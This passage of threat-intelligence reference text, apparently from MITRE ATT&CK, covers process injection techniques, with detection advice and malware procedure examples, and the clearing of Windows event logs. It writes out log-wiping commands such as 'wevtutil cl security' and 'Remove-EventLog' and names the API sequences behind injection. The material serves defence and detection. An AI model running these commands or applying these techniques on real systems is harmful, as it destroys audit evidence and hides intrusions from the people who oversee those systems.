+- [S0613] PS1: PS1 can inject its payload DLL Into memory.
+- [S0250] Koadic: Koadic can perform process injection by using a reflective DLL.
+- [S0055] RARSTONE: After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.
+- [S0154] Cobalt Strike: Cobalt Strike has the ability to load DLLs via reflective injection.
+- [S0461] SDBbot: SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process.
+- [S0455] Metamorfo: Metamorfo has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).
+- [S0126] ComRAT: ComRAT has injected its orchestrator DLL into explorer.exe. ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.
+- [S0273] Socksbot: Socksbot creates a suspended svchost process and injects its DLL into it.
+- [S1039] Bumblebee: The Bumblebee loader can support the `Dij` command which gives it the ability to inject DLLs into the memory of other processes.
+- [S0681] Lizar: Lizar has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading.
+- [G1026] Malteiro: Malteiro has injected Mispadu’s DLL into a process.
+- [S1044] FunnyDream: The FunnyDream FilepakMonitor component can inject into the Bka.exe process using the `VirtualAllocEx`, `WriteProcessMemory` and `CreateRemoteThread` APIs to load the DLL component.
+- [S0449] Maze: Maze has injected the malware DLL into a target process.
+- [S0167] Matryoshka: Matryoshka uses reflective DLL injection to inject the malicious library and execute the RAT.
+- [S0192] Pupy: Pupy can migrate into another process using reflective DLL injection.
+- [S0194] PowerSploit: PowerSploit contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.
+- [S0182] FinFisher: FinFisher injects itself into various processes depending on whether it is low integrity or high integrity.
+- [S0501] PipeMon: PipeMon can inject its modules into various processes using reflective DLL loading.
+- [S0024] Dyre: Dyre injects into other processes to load modules.
+- [S1210] Sagerunex: Sagerunex is designed to be dynamic link library (DLL) injected into an infected endpoint and executed directly in memory.
+- [G0135] BackdoorDiplomacy: BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.
+- [S0460] Get2: Get2 has the ability to inject DLLs into processes.
+- [S0011] Taidoor: Taidoor can perform DLL loading.
+- [S0241] RATANKBA: RATANKBA performs a reflective DLL injection using a given pid.
+- [S1081] BADHATCH: BADHATCH has the ability to execute a malicious DLL by injecting into `explorer.exe` on a compromised machine.
+- [S0576] MegaCortex: MegaCortex loads injecthelper.dll into a newly created rundll32.exe process.
+- [S0603] Stuxnet: Stuxnet injects an entire DLL into an existing, newly created, or preselected trusted process.
+- [C0015] C0015: During C0015, the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process.
+- [G0065] Leviathan: Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.
+- [S0265] Kazuar: If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes.
+- [S0038] Duqu: Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).
+- [S0012] PoisonIvy: PoisonIvy can inject a malicious DLL into a process.
+- [S0021] Derusbi: Derusbi injects itself into the secure shell (SSH) process.
+- [S0412] ZxShell: ZxShell is injected into a shared SVCHOST process.
+- [G0024] Putter Panda: An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).
+- [S0666] Gelsemium: Gelsemium has the ability to inject DLLs into specific processes.
+- [S0135] HIDEDRV: HIDEDRV injects a DLL for Downdelph into the explorer.exe process.
+- [S0335] Carbon: Carbon has a command to inject code into a process.
+- [G0032] Lazarus Group: A Lazarus Group malware sample performs reflective DLL injection.
+- [G0081] Tropic Trooper: Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe.
+- [S0581] IronNetInjector: IronNetInjector has the ability to inject a DLL into running processes, including the IronNetInjector DLL into explorer.exe.
+- [S0467] TajMahal: TajMahal has the ability to inject DLLs for malicious plugins into running processes.
+- [S1026] Mongall: Mongall can inject a DLL into `rundll32.exe` for execution.
+- [S0575] Conti: Conti has loaded an encrypted DLL into memory and then executes it.
+- [S0458] Ramsay: Ramsay can use ImprovedReflectiveDLLInjection to deploy components.
+- [S0022] Uroburos: Uroburos can use DLL injection to load embedded files and modules.
+- [S0484] Carberp: Carberp's bootkit can inject a malicious DLL into the address space of running processes.
+- [S0615] SombRAT: SombRAT can execute loadfromfile, loadfromstorage, and loadfrommem to inject a DLL from disk, storage, or memory respectively.
+- [S0018] Sykipot: Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.
+- [S0367] Emotet: Emotet has been observed injecting in to Explorer.exe and other processes.
+- [S0456] Aria-body: Aria-body has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.
+- [S0457] Netwalker: The Netwalker DLL has been injected reflectively into the memory of a legitimate running process.
+- [G0092] TA505: TA505 has been seen injecting a DLL into winword.exe.
+- [S0081] Elise: Elise injects DLL files into iexplore.exe.
+- [G0102] Wizard Spider: Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.
+- [S0596] ShadowPad: ShadowPad has injected a DLL into svchost.exe.
+
+### T1055.002 - Process Injection: Portable Executable Injection
+
+Description:
+
+Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S1063] Brute Ratel C4: Brute Ratel C4 has injected Latrodectus into the Explorer.exe process on comrpomised hosts.
+- [S0260] InvisiMole: InvisiMole can inject its backdoor as a portable executable into a target process.
+- [S0030] Carbanak: Carbanak downloads an executable and injects it directly into a new process.
+- [G0106] Rocke: Rocke's miner, "TermsHost.exe", evaded defenses by injecting itself into Windows processes, including Notepad.exe.
+- [G0078] Gorgon Group: Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process.
+- [S0681] Lizar: Lizar can execute PE files in the address space of the specified process.
+- [S1138] Gootloader: Gootloader can use its own PE loader to execute payloads in memory.
+- [S0342] GreyEnergy: GreyEnergy has a module to inject a PE binary into a remote process.
+- [S1158] DUSTPAN: DUSTPAN can inject its decrypted payload into another process.
+- [S1145] Pikabot: Pikabot, following payload decryption, creates a process hard-coded into the dropped (e.g., WerFault.exe) and injects the decrypted core modules into it.
+- [S0330] Zeus Panda: Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process.
+
+### T1055.003 - Process Injection: Thread Execution Hijacking
+
+Description:
+
+Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively. This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S1145] Pikabot: Pikabot can create a suspended instance of a legitimate process (e.g., ctfmon.exe), allocate memory within the suspended process corresponding to Pikabot's core module, then redirect execution flow via `SetContextThread` API so that when the thread resumes the Pikabot core module is executed.
+- [S0579] Waterbear: Waterbear can use thread injection to inject shellcode into the process of security software.
+- [S0168] Gazer: Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.
+- [S0094] Trojan.Karagany: Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API.
+
+### T1055.004 - Process Injection: Asynchronous Procedure Call
+
+Description:
+
+Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL). A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. AtomBombing is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S0199] TURNEDUP: TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an "Early Bird injection."
+- [S0517] Pillowmint: Pillowmint has used the NtQueueApcThread syscall to inject code into svchost.exe.
+- [S0260] InvisiMole: InvisiMole can inject its code into a trusted process via the APC queue.
+- [S1039] Bumblebee: Bumblebee can use asynchronous procedure call (APC) injection to execute commands received from C2.
+- [S1018] Saint Bot: Saint Bot has written its payload into a newly-created `EhStorAuthn.exe` process using `ZwWriteVirtualMemory` and executed it using `NtQueueApcThread` and `ZwAlertResumeThread`.
+- [S0484] Carberp: Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread.
+- [S0483] IcedID: IcedID has used ZwQueueApcThread to inject itself into remote processes.
+- [S1207] XLoader: XLoader injects code into the APC queue using `NtQueueApcThread` API.
+- [S1081] BADHATCH: BADHATCH can inject itself into a new `svchost.exe -k netsvcs` process using the asynchronous procedure call (APC) queue.
+- [G0061] FIN8: FIN8 has injected malicious code into a new svchost.exe process.
+- [S0438] Attor: Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API.
+- [S1085] Sardonic: Sardonic can use the `QueueUserAPC` API to execute shellcode on a compromised machine.
+
+### T1055.005 - Process Injection: Thread Local Storage
+
+Description:
+
+Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S0386] Ursnif: Ursnif has injected code into target processes via thread local storage callbacks.
+
+### T1055.008 - Process Injection: Ptrace System Calls
+
+Description:
+
+Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S1109] PACEMAKER: PACEMAKER can use PTRACE to attach to a targeted process to read process memory.
+
+### T1055.009 - Process Injection: Proc Memory
+
+Description:
+
+Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within /proc/[pid]/maps can be overwritten using dd. Other techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep). Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [C0035] KV Botnet Activity: KV Botnet Activity final payload installation includes mounting and binding to the \/proc\/ filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts.
+
+### T1055.011 - Process Injection: Extra Window Memory Injection
+
+Description:
+
+Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM. Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong and SetWindowLong . Malware associated with this technique have also used SendNotifyMessage to trigger the associated window procedure and eventual malicious injection.
+
+Procedures:
+
+- [S0091] Epic: Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.
+- [S0177] Power Loader: Power Loader overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.
+
+### T1055.012 - Process Injection: Process Hollowing
+
+Description:
+
+Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively. This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Processing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [G0078] Gorgon Group: Gorgon Group malware can use process hollowing to inject one of its trojans into another process.
+- [S0483] IcedID: IcedID can inject a Cobalt Strike beacon into cmd.exe via process hallowing.
+- [S1207] XLoader: XLoader uses process hollowing by injecting itself into the `explorer.exe` process and other files ithin the Windows `SysWOW64` directory.
+- [G0027] Threat Group-3390: A Threat Group-3390 tool can spawn `svchost.exe` and inject the payload into that process.
+- [S0662] RCSession: RCSession can launch itself from a hollowed svchost.exe process.
+- [S0354] Denis: Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.
+- [S1065] Woody RAT: Woody RAT can create a suspended notepad process and write shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`.
+- [S0344] Azorult: Azorult can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution.
+- [G0040] Patchwork: A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.
+- [S0650] QakBot: QakBot can use process hollowing to execute its main payload.
+- [S0154] Cobalt Strike: Cobalt Strike can use process hollowing for execution.
+- [S0447] Lokibot: Lokibot has used process hollowing to inject itself into legitimate Windows process.
+- [S1086] Snip3: Snip3 can use RunPE to execute malicious payloads within a hollowed Windows process.
+- [S0234] Bandook: Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload.
+- [S1213] Lumma Stealer: Lumma Stealer has used process hollowing leveraging a legitimate program such as “BitLockerToGo.exe” to inject a malicious payload.
+- [G1043] BlackByte: BlackByte used process hollowing for defense evasion purposes.
+- [S1130] Raspberry Robin: Raspberry Robin will execute a legitimate process, then suspend it to inject code for a Tor client into the process, followed by resumption of the process to enable Tor client execution.
+- [S0226] Smoke Loader: Smoke Loader spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.
+- [S0373] Astaroth: Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.
+- [S0567] Dtrack: Dtrack has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%.
+- [G1018] TA2541: TA2541 has used process hollowing to execute CyberGate malware.
+- [S0689] WhisperGate: WhisperGate has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility `InstallUtil.exe`.
+- [S0128] BADNEWS: BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process.
+- [S0660] Clambling: Clambling can execute binaries through process hollowing.
+- [S1138] Gootloader: Gootloader can inject its Delphi executable into ImagingDevices.exe using a process hollowing technique.
+- [G0045] menuPass: menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.
+- [S0189] ISMInjector: ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.
+- [S1018] Saint Bot: The Saint Bot loader has used API calls to spawn `MSBuild.exe` in a suspended state before injecting the decrypted Saint Bot binary into it.
+- [S0198] NETWIRE: The NETWIRE payload has been injected into benign Microsoft executables via process hollowing.
+- [S0367] Emotet: Emotet uses a copy of `certutil.exe` stored in a temporary directory for process hollowing, starting the program in a suspended state before loading malicious code.
+- [S0331] Agent Tesla: Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code.
+- [S0229] Orz: Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload.
+- [S0266] TrickBot: TrickBot injects into the svchost.exe process.
+- [S0386] Ursnif: Ursnif has used process hollowing to inject into child processes.
+- [G0094] Kimsuky: Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.
+- [S0534] Bazar: Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing.
+- [S0127] BBSRAT: BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.
+- [S0038] Duqu: Duqu is capable of loading executable code via process hollowing.
+- [S1111] DarkGate: DarkGate leverages process hollowing techniques to evade detection, such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe.
+
+### T1055.013 - Process Injection: Process Doppelgänging
+
+Description:
+
+Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. Adversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. Process Doppelgänging is implemented in 4 steps : * Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. * Load – Create a shared section of memory and load the malicious executable. * Rollback – Undo changes to original executable, effectively removing malicious code from the file system. * Animate – Create a process from the tainted section of memory and initiate execution. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitor and analyze calls to CreateTransaction, CreateFileTransacted, RollbackTransaction, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to NtCreateProcessEx and NtCreateThreadEx as well as API calls used to modify memory within another process, such as WriteProcessMemory. Scan file objects reported during the PsSetCreateProcessNotifyRoutine, which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. Also consider comparing file objects loaded in memory to the corresponding file on disk. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S0242] SynAck: SynAck abuses NTFS transactions to launch and conceal malicious processes.
+- [S0534] Bazar: Bazar can inject into a target process using process doppelgänging.
+- [G0077] Leafminer: Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems.
+
+### T1055.014 - Process Injection: VDSO Hijacking
+
+Description:
+
+Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions). Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+### T1055.015 - Process Injection: ListPlanting
+
+Description:
+
+Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process. List-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a SysListView32 control. ListPlanting (a form of message-passing "shatter attack") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other Process Injection methods. Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function. For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory. Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.
+
+Detection:
+
+Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as FindWindow, FindWindowEx, EnumWindows, EnumChildWindows, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be abused for this technique. Consider monitoring for excessive use of SendMessage and/or PostMessage API functions with LVM_SETITEMPOSITION and/or LVM_GETITEMPOSITION arguments. Analyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S0260] InvisiMole: InvisiMole has used ListPlanting to inject code into a trusted process.
+
+
+### T1070.001 - Indicator Removal: Clear Windows Event Logs
+
+Description:
+
+Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit. With administrator privileges, the event logs can be cleared with the following utility commands: * wevtutil cl system * wevtutil cl application * wevtutil cl security These logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command Remove-EventLog -LogName Security to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot. Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.
+
+Detection:
+
+Deleting Windows event logs (via native binaries , API functions , or PowerShell ) may also generate an alterable event (Event ID 1102: "The audit log was cleared").
+
+Procedures:
+
+- [S1202] LockBit 3.0: LockBit 3.0 can delete log files on targeted systems.
+- [S0688] Meteor: Meteor can use Wevtutil to remove Security, System and Application Event Viewer logs.
+- [G0061] FIN8: FIN8 has cleared logs during post compromise cleanup activities.
+- [S0242] SynAck: SynAck clears event logs.
+- [S0368] NotPetya: NotPetya uses wevtutil to clear the Windows event logs.
+- [S1212] RansomHub: RansomHub can delete events from the Security, System, and Application logs.
+- [S1178] ShrinkLocker: ShrinkLocker calls Wevtutil to clear the Windows PowerShell and Microsoft-Windows-Powershell/Operational logs.
+- [S1060] Mafalda: Mafalda can delete Windows Event logs by invoking the `OpenEventLogW` and `ClearEventLogW` functions.
+- [G1017] Volt Typhoon: Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of intrusion activity.
